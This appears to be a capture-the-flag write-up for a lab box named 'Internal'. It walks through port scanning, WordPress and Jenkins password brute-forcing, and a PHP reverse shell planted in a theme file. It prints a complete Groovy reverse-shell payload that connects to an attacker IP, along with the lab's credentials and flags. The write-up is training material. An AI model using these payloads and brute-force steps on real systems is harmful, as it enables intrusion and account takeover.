> Internal | Security Misconfig

# Nmap

nmap -sC -sV -T4 -Pn -vvv -A internal.thm -oN nmap/initial

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

# FFUF

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://internal.thm/FUZZ -mc 200,301 -c

```bash
blog                    [Status: 301, Size: 311, Words: 20, Lines: 10]
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10]
phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10]
```

Looking at /blog we can see that it a wordpress site and we also have phpmyadmin. Let's start with blog!

wpscan --url http://internal.thm/blog -e -v -o wp_enumeration.tx

We found 3 important things here. Version, theme used and a username.

```bash
[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
[+] WordPress theme in use: twentyseventeen
| Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
| Last Updated: 2021-04-27T00:00:00.000Z
| Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
| [!] The version is out of date, the latest version is 2.7
| Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
[i] User(s) Identified:
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
```

Since we have username let's bruteforce with wpscan.

wpscan --url http://internal.thm/blog/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt -f cli

```bash
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```

Since we are in and we know that we have an outdated theme, let's use theme editor and edit 404.php content's to PentestMonkey Reverse shell. And accessing `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php` we have a shell! 🧐

And since we have phpmyadmin let's try to search for passwords. Usually they are stored in `/etc/phpmyadmin/config-db.php`

```bash
$dbuser='phpmyadmin';
$dbpass='B2Ud4fEOZmVq';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
```

Actually pretty much nothing in here. So as I was looking around in /opt folder we find a file.

# wp-save.txt 

```bash
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

We can SSH as `aubreanna`.


# user.txt

```
THM{int3rna1_fl4g_1}
```

We can also find another file.

# jenkins.txt 

```
Internal Jenkins service is running on 172.17.0.2:8080
```

Let's SSH tunnel and get it to our machine.

ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.104.55

Let's use OWASP ZAP to bruteforce password. I used OWASP ZAP's Fuzzer and kertbrutepass.txt as a password list with username as `admin`. And checking Response Header Size's difference we can see that the password is `spongebob`.

We can access `Script Console` by clicking on Manage Button. And we can execute any Groovy Script. Let's upload Groovy Reverse Shell from PayloadAllTheThings.

```java
String host="10.9.12.130";
int port=4242;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

And we are in as `jenkins`. In /opt dir, we can find a file.

# note.txt

```bash
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

And using the credentials given we can login as root using SSH.

# root.txt

```
THM{d0ck3r_d3str0y3r}
```